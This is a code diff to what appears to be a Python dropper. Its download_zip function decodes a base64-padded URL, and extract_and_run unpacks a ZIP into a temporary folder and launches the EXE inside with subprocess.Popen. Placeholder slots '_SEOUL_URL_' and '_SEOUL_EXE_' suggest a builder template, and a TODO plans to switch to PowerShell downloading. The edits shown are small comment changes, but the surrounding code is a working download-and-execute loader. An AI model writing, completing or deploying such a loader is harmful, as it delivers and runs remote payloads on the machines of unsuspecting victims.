@@ -7,10 +7,9 @@ import subprocess
 import tempfile
 from urllib.parse import unquote
 
-
-def download_zip(url):  # Parameter name was wrong (used 'url' in call but 'url' in definition)
+# TODO: add powershell downloading instead of requests
+def download_zip(url):
     try:
-        # Add padding if needed for Base64
         padding = len(url) % 4
         if padding:
             url += "=" * (4 - padding)
@@ -47,14 +46,14 @@ def extract_and_run(zip_data):
                 subprocess.Popen([exe_path], cwd=tmpdir)
             else:
                 print("[!] EXE not found in ZIP! Contents:")
-                print(os.listdir(tmpdir))  # Show extracted files
+                print(os.listdir(tmpdir))
     except Exception as e:
         print(f"[!] Extraction failed: {e}")
 
 
 def main():
     url = '_SEOUL_URL_'  
-    execuatable_name = "_SEOUL_EXE_"
+    execuatable_name = "_SEOUL_EXE_" # working on it
     
     zip_data = download_zip(url)
     if zip_data:
